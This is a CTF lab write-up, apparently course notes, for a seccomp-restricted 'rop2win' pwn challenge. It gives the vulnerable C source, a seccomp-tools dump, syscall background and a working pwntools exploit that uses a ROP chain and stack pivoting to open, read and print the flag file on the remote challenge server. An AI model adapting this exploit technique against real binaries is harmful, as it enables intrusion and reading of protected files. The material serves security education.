# Simple PWN - 0x10(`seccomp`/Lab - `rop2win`)
###### tags: `CTF` `PWN` `eductf`

challenge: `nc edu-ctf.zoolab.org 10005`
## `seccomp` background
[Pwn week1](https://youtu.be/ktoVQB99Gj4?t=8457)

## Original Code
:::spoiler
```cpp!=
#include <stdio.h>
#include <unistd.h>
#include <seccomp.h>

char fn[0x20];
char ROP[0x100];


// fd = open("flag", 0);
// read(fd, buf, 0x30);
// write(1, buf, 0x30); // 1 --> stdout

int main()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);

    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
    seccomp_load(ctx);
    seccomp_release(ctx);

    printf("Give me filename: ");
    read(0, fn, 0x20);

    printf("Give me ROP: ");
    read(0, ROP, 0x100);

    char overflow[0x10];
    printf("Give me overflow: ");
    read(0, overflow, 0x30);

    return 0;
}
```
:::
* You can observe that it just allow `open`, `read`, `write` system call, so our goal is <font color="FF0000">**read the flag in the server**</font> by using these allowable system call.
* It has global variable so that we can write `ROP` chain in it.
* You also can analyze the sample `ELF` file by `seccomp-tools` if there is no source code
    ```bash
    $ seccomp-tools dump ./chal
     line  CODE  JT   JF      K
    =================================
     0000: 0x20 0x00 0x00 0x00000004  A = arch
     0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
     0002: 0x20 0x00 0x00 0x00000000  A = sys_number
     0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
     0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
     0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
     0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
     0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010
     0008: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0010
     0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011
     0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0011: 0x06 0x00 0x00 0x00000000  return KILL
    ```

## ROW Background
* According to [open(2) — Linux manual page](https://man7.org/linux/man-pages/man2/open.2.html), it'll return `fd`(file descriptor).
    > The open() system call opens the file specified by `pathname`.  If the specified file does not exist, it may optionally (if O_CREAT is specified in flags) be created by open().
    
    > The return value of open() is a file descriptor, a small, `nonnegative` integer that is an index to an entry in the process's table of open file descriptors.  The file descriptor is used in subsequent system calls (`read(2)`, `write(2)`, `lseek(2)`, `fcntl(2)`, etc.) to refer to the open file.  The file descriptor returned by a successful call will be the lowest-numbered file descriptor not currently open for the process.
    * Note that, more info. about `fd` can refer to 
    [Linux 核心設計: 檔案系統概念及實作手法 (上) - 34:53](https://youtu.be/d8ZN5-XTIJM?t=2093), 
    [Linux 核心設計: 檔案系統概念及實作手法 (上) - 58:29](https://youtu.be/d8ZN5-XTIJM?t=3509), 
    [理解linux中的file descriptor(文件描述符)](https://wiyi.org/linux-file-descriptor.html)
* According to [read(2) — Linux manual page](https://man7.org/linux/man-pages/man2/read.2.html)
    > read() attempts to read up to count bytes from file descriptor `fd` into the buffer starting at `buf`.
* According to [write(2) — Linux manual page](https://man7.org/linux/man-pages/man2/write.2.html)
    > write() writes up to count bytes from the buffer starting at `buf` to the file referred to by the file descriptor fd.
* According to [Linux System Call Table for x86 64](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)
    |   %rax   | System Call |         %rdi          |           %rsi            |           %rdx            | %r10 | %r8 | %r9 |
    |:--------:|:-----------:|:---------------------:|:-------------------------:|:-------------------------:|:----:|:---:|:---:|
    |0|sys_read|unsigned int fd|char \*buf|size_t count||||
    |1|sys_write|unsigned int fd|const char \*buf|size_t count||||
    |2|sys_open|	const char \*filename|int flags|int mode||||
    * Note that, flags argument in `sys_open` is:
        > The argument flags must include one of the following access modes: O_RDONLY, O_WRONLY, or O_RDWR.  These request opening the file read-only, write-only, or read/write, respectively.
    * mode argument can ignore

## Exploit - `ROP` + stack pivoting
1. Find the address of global variable that is `fn` and `ROP`
    ```bash!
    $ objdump -d -M Intel chal | grep "<fn>"
    40189c: 48 8d 05 9d 1a 0e 00    lea 0xe1a9d(%rip),%rax # 4e3340 <fn>
    $ objdump -d -M Intel chal | grep "<ROP>"
    4018c9: 48 8d 05 90 1a 0e 00    lea 0xe1a90(%rip),%rax # 4e3360 <ROP>
    ```
    ```python!
    fn = 0x4e3340
    ROP_addr = 0x4e3360
    ```
2. Find `ROP` gadget address
    ```bash!
    $ ROPgadget --binary chal --multibr --only "pop|syscall|ret|leave" > one_gadget
    $ vim one_gadget
    ```
    ```python!
    pop_rax_ret = 0x45db87
    pop_rdi_ret = 0x4038b3
    pop_rsi_ret = 0x402428
    pop_rdx_rbx_ret = 0x493a2b
    syscall_ret = 0x4284b6
    leave_ret = 0x40190c
    ```
3. Construct `ROP` chain
    ```python!
    ROP = flat(
       # Open filename
       # fd = open("flag", 0);
       pop_rax_ret, 2,
       pop_rdi_ret, fn,
       pop_rsi_ret, 0,
       syscall_ret,

       # Read the file
       # read(fd, buf, 0x30);
       pop_rax_ret, 0,
       pop_rdi_ret, 3,    # we can oversee the fd is 3 because 0,1,2 are preserved by default
       pop_rsi_ret, fn,
       pop_rdx_rbx_ret, 0x30, 0,
       syscall_ret,

       # Write the file
       # write(1, buf, 0x30); // 1 --> stdout
       # the 2nd and 3rd argument are the same to read
       pop_rax_ret, 1,
       pop_rdi_ret, 1,
       syscall_ret,
       )
    ```
4. Write `ROP` chain to global variable(a new stack)
    ```python!
    r.sendafter("Give me ROP:", b'a'*0x8 + ROP)
    ```
    * Note that, you must try and error to observe how many bytes you have to overlap by trash such as `b'a'*0x8`
5. Stack pivoting
    ```python!
    r.sendafter('Give me overflow:', b'a'*0x20 + p64(ROP_addr) + p64(leave_ret))
    ```
    * Note that, you must try and error to observe how many bytes you have to overlap by trash such as `b'a'*0x20`
6. Where is the flag file in remote server?
You can build the docker and observe the relative position → `/home/chal/flag`
    ```python!
    r.sendafter("Give me filename:", '/home/chal/flag\x00')
    ```
7. Then we got flag!!!
    ![](https://imgur.com/DdvxfZy.png)
* Whole exploit
    :::spoiler code
    ```python=
    from pwn import *

    #r = process('./chal')
    r = remote('edu-ctf.zoolab.org', 10005)
    raw_input()
    context.arch = 'amd64'

    fn = 0x4e3340
    ROP_addr = 0x4e3360

    pop_rax_ret = 0x45db87
    pop_rdi_ret = 0x4038b3
    pop_rsi_ret = 0x402428
    pop_rdx_rbx_ret = 0x493a2b
    syscall_ret = 0x4284b6
    leave_ret = 0x40190c

    ROP = flat(
       # Open filename
       pop_rax_ret, 2,
       pop_rdi_ret, fn,
       pop_rsi_ret, 0,
       syscall_ret,

       # Read the file
       pop_rax_ret, 0,
       pop_rdi_ret, 3,
       pop_rsi_ret, fn,
       pop_rdx_rbx_ret, 0x30, 0,
       syscall_ret,

       # Write the file
       pop_rax_ret, 1,
       pop_rdi_ret, 1,
       syscall_ret,
       )

    r.sendafter("Give me filename:", '/home/chal/flag\x00')
    r.sendafter("Give me ROP:", b'a'*0x8 + ROP)
    r.sendafter('Give me overflow:', b'a'*0x20 + p64(ROP_addr) + p64(leave_ret))

    r.interactive()
    ```
    :::
# Reference 
[Linux 核心設計: 檔案系統概念及實作手法 (上)](https://youtu.be/d8ZN5-XTIJM)